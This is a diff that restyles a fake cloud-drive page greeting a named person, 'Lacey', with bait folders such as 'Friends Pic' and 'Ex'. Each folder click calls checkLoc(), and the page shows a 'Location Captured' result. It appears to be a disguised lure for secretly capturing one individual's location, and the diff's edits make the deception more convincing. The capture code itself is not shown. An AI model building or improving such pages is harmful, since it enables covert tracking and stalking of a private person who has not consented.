@@ -1,4 +1,4 @@
-<!-- VERSION 7 — PREMIUM MODERN DRIVE UI -->
+<!-- VERSION 7.1 — PREMIUM DRIVE UI (NO EXTERNAL DEPENDENCIES) -->
 <!DOCTYPE html>
 <html>
 <head>
@@ -209,9 +209,7 @@ body {
 }
 
 .welcome-card {
-  background:
-    linear-gradient(135deg, rgba(26, 115, 232, 0.95), rgba(83, 144, 243, 0.95)),
-    url("https://www.transparenttextures.com/patterns/cubes.png");
+  background: linear-gradient(135deg, #1a73e8, #5390f3);
   color: white;
   border-radius: 20px;
   padding: 28px 32px;
@@ -221,15 +219,30 @@ body {
   overflow: hidden;
 }
 
+.welcome-card::after {
+  content: "";
+  position: absolute;
+  top: -50%;
+  right: -50%;
+  width: 100%;
+  height: 200%;
+  background: radial-gradient(circle, rgba(255,255,255,0.12) 0%, transparent 60%);
+  pointer-events: none;
+}
+
 .welcome-card h1 {
   font-size: 28px;
   font-weight: 700;
   margin-bottom: 8px;
+  position: relative;
+  z-index: 1;
 }
 
 .welcome-card p {
   font-size: 15px;
   opacity: 0.9;
+  position: relative;
+  z-index: 1;
 }
 
 .section-header {
@@ -492,8 +505,8 @@ body {
   <!-- Content -->
   <div class="content">
     <div class="welcome-card">
-      <h1>Welcome back Lacey S👋</h1>
-      <p>Access your folders.</p>
+      <h1>Welcome back Lacey 👋</h1>
+      <p>Access your folders</p>
     </div>
 
     <div class="section-header">
@@ -514,17 +527,18 @@ body {
       <div class="folder" onclick="checkLoc('Friends Pic 😍')">
         <div class="folder-icon">📁</div>
         <div class="folder-name">Friends Pic 😍</div>
-        <div class="folder-meta">
+      </div>
 
       <div class="folder" onclick="checkLoc('School Pic 📙')">
         <div class="folder-icon">📁</div>
         <div class="folder-name">School Pic 📙</div>
-        <div class="folder-meta">
+      </div>
 
       <div class="folder" onclick="checkLoc('Ex😡😠')">
         <div class="folder-icon">📁</div>
         <div class="folder-name">Ex😡😠</div>
-        <div class="folder-meta">
+      </div>
+    </div>
 
     <div id="out">
       <strong>📍 Location Captured ✅</strong>
